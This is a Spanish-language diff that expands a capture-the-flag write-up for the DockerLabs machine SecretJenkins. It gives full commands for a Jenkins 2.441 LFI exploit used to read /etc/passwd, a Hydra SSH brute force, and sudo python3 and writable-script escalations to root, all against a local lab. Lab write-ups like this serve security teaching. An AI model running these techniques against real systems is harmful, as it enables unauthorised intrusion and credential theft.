@@ -1,74 +1,271 @@
-# SECRETJENKINS — DockerLabs
+# SecretJenkins — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 11/05/2024  
+**Técnicas:** Jenkins LFI · Searchsploit · Hydra · SSH · Python sudo abuse · Writable script
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **SECRETJENKINS** de DockerLabs.
-
----
-
-## 1. Reconocimiento
-
-Desplegamos el laboratorio
-
-Para comprobar que tenemos conexión con el laboratorio haremos un ping.
-
-Vamos a hacer un escaneo rápido y con el parámetro -Pn por si no permite
-conexiones ping el laboratorio
-
-## 2. Enumeración
-
-Al ver los puertos abiertos, ahora haremos un escaneo mas profundo
-especificando los puertos y buscando la versión con la que cuenta cada servicio.
-
-Vemos que tenemos un servidor Jetty por el puerto 8080, vamos a ver que nos
-encontramos.
-
-Vamos a ver que versiones en la pagina web nos encontramos por si encontramos
-un exploit, vemos que tenemos una versión de Jenkins y Jetty
-
-## 3. Explotación
-
-Ahora buscaremos un exploit y lo vamos a intentar ejecutar
-
-Vamos a localizar ese exploit y lo copiaremos en nuestro directorio del laboratorio.
-
-Lo ejecutaremos para ver como se puede utilizar y vemos que nos pide poner la
-URL del laboratorio atacado.
-
-## 4. Post-explotación
-
-Lo colocamos y nos permite elegir un directorio para descargar
-
-Vamos a descargar el directorio passwd para ver con que usuarios nos
-encontramos.
-
-Al ver los usuarios, ahora intentaremos hacer un ataque de fuerza bruta.
-
-## 5. Escalada de privilegios
-
-Vemos que encontramos la contraseña así que nos conectaremos por ssh
-
-Vamos a ver si tenemos privilegios como sudo, tenemos el binario de python3 pero
-solamente con el usuario pinguinito, así que ejecutaremos como sudo y vamos a
-escribir un pequeño script para poder escalar y tener una consola bash.
-
-Ahora ya que somos el usuario volveremos a ver si tenemos privilegios para
-ejecutar como sudo.
-Tenemos un script al que podemos ejecutar.
-
-## 6. Lección aprendida
-
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
-
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración Jenkins](#2-enumeración-jenkins)
+3. [Explotación LFI — Jenkins 2.441](#3-explotación-lfi--jenkins-2441)
+4. [Fuerza bruta SSH — Hydra](#4-fuerza-bruta-ssh--hydra)
+5. [Escalada de privilegios — usuario pinguinito](#5-escalada-de-privilegios--usuario-pinguinito)
+6. [Escalada final a root](#6-escalada-final-a-root)
+7. [Lección aprendida](#7-lección-aprendida)
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 1. Despliegue y reconocimiento
+
+Desplegamos el laboratorio:
+
+```bash
+sudo bash auto_deploy.sh secretjenkins.tar
+```
+
+> IP asignada: `172.17.0.2`
+
+Comprobamos conectividad:
+
+```bash
+ping -c 4 172.17.0.2
+```
+
+Realizamos un escaneo rápido:
+
+```bash
+nmap -Pn 172.17.0.2
+```
+
+Resultado:
+
+```text
+22/tcp open ssh
+8080/tcp open http-proxy
+```
+
+Enumeramos versiones:
+
+```bash
+nmap -p22,8080 -sCV -Pn 172.17.0.2
+```
+
+Resultado:
+
+```text
+OpenSSH 9.2p1 Debian
+Jetty 10.0.18
+Jenkins 2.441
+```
+
+---
+
+## 2. Enumeración Jenkins
+
+Accedemos al servicio web:
+
+```text
+http://172.17.0.2:8080
+```
+
+Encontramos un panel de login de Jenkins.
+
+Inspeccionando las cabeceras HTTP identificamos:
+
+```text
+Jenkins 2.441
+Jetty 10.0.18
+```
+
+---
+
+## 3. Explotación LFI — Jenkins 2.441
+
+Buscamos exploits disponibles:
+
+```bash
+searchsploit Jenkins 2.441
+```
+
+Resultado:
+
+```text
+Jenkins 2.441 - Local File Inclusion
+```
+
+Localizamos el exploit:
+
+```bash
+locate java/webapps/51993.py
+```
+
+Copiamos el exploit:
+
+```bash
+cp /usr/share/exploitdb/exploits/java/webapps/51993.py .
+```
+
+Comprobamos uso:
+
+```bash
+python3 51993.py
+```
+
+Ejecutamos el exploit:
+
+```bash
+python3 51993.py -u http://172.17.0.2:8080
+```
+
+Leemos `/etc/passwd`:
+
+```text
+/etc/passwd
+```
+
+Usuarios encontrados:
+
+```text
+bobby
+pinguinito
+jenkins
+```
+
+---
+
+## 4. Fuerza bruta SSH — Hydra
+
+Realizamos fuerza bruta contra el usuario `bobby`:
+
+```bash
+hydra -l bobby -P /usr/share/wordlists/rockyou.txt \
+ssh://172.17.0.2
+```
+
+Resultado:
+
+```text
+login: bobby
+password: chocolate
+```
+
+Accedemos mediante SSH:
+
+```bash
+ssh bobby@172.17.0.2
+```
+
+Comprobamos permisos sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(pinguinito) NOPASSWD: /usr/bin/python3
+```
+
+---
+
+## 5. Escalada de privilegios — usuario pinguinito
+
+Ejecutamos Python como el usuario `pinguinito`:
+
+```bash
+sudo -u pinguinito /usr/bin/python3
+```
+
+Dentro de la consola Python:
+
+```python
+import os
+os.system("bash")
+```
+
+Verificamos usuario:
+
+```bash
+whoami
+pinguinito
+```
+
+Comprobamos nuevamente privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(root) NOPASSWD: /usr/bin/python3 /opt/script.py
+```
+
+---
+
+## 6. Escalada final a root
+
+Eliminamos el script original:
+
+```bash
+cd /opt
+rm -r script.py
+```
+
+Creamos uno nuevo:
+
+```bash
+touch script.py
+```
+
+Añadimos el payload:
+
+```bash
+echo 'import os; os.system("/bin/bash")' > script.py
+```
+
+Ejecutamos como root:
+
+```bash
+sudo /usr/bin/python3 /opt/script.py
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
+
+---
+
+## 7. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Jenkins vulnerable a LFI | Lectura arbitraria de archivos |
+| Credenciales débiles SSH | Acceso remoto |
+| Python ejecutable con sudo | Escalada horizontal |
+| Script Python escribible | Escalada final a root |
+
+**Para defenderse:**
+
+- Mantener Jenkins actualizado.
+- Aplicar políticas robustas de contraseñas.
+- Restringir permisos sudo innecesarios.
+- Proteger scripts ejecutados con privilegios elevados.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
